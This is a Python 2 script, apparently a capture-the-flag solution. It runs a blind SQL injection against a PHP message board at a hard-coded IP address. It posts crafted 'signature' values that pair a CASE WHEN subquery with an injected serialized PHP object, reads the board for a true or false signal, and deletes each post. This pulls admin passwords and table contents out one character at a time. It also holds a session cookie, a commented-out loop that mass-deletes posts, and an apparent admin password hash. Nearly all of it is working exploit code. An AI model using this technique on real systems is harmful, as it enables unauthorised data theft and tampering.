publish_url = "http://47.97.221.96:23333/index.php?action=publish"
index_url = "http://47.97.221.96:23333/index.php?action=index"
del_url = "http://47.97.221.96:23333/index.php?action=delete&delid="

# signature=g&mood=0
# 2`-case when (select password from ctf_users where is_admin like 0x31) like 0x25 then 1 else 0 end,`O:4:"Mood":3:{s:4:"mood";i:0;s:2:"ip";s:13:"58.76.163.238";s:4:"date";i:1520759194;}`)#

import urllib
import urllib2
import sys
import string
result = ''
charset = ','+string.lowercase + string.digits+'-_'
#charset = string.digits + 'abcdef'
# 2533f492a796a3227b0c6f91d102cc36:admin"1
'''
for i in range(200,1000):
    print i
    req = urllib2.Request(del_url+str(i))
    req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
    res = urllib2.urlopen(req)
'''
for i in range(100):
    for j in charset: 
        # write board
        data = 'signature=2`-case when (select concat(signature,mood) from ctf_user_signature order by id limit 1,1) like 0x'+result.encode('hex')+j.encode('hex')+'25 then 1 else 0 end,`O:4:"Mood":3:{s:4:"mood";i:0;s:2:"ip";s:13:"58.76.163.238";s:4:"date";i:1520759194;}`)#&mood=0'
        req = urllib2.Request(publish_url,data)
        req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
        res = urllib2.urlopen(req)
        print res.read()
        # read board
        req = urllib2.Request(index_url)
        req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
        res = urllib2.urlopen(req)
        p = res.read()
        print p
        body = p.split('<div class="panel-body">')[1].split('<img src=')[0]
        delnum = p.split('index.php?action=delete&delid=')[1].split('"')[0]
        #delete board
        req = urllib2.Request(del_url+delnum)
        req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
        res = urllib2.urlopen(req)

        if '1' in body:
            sys.stdout.write(j)
            sys.stdout.flush()
            result += j
            break

    if len(result)!=(i+1):
        break

print ''
print result
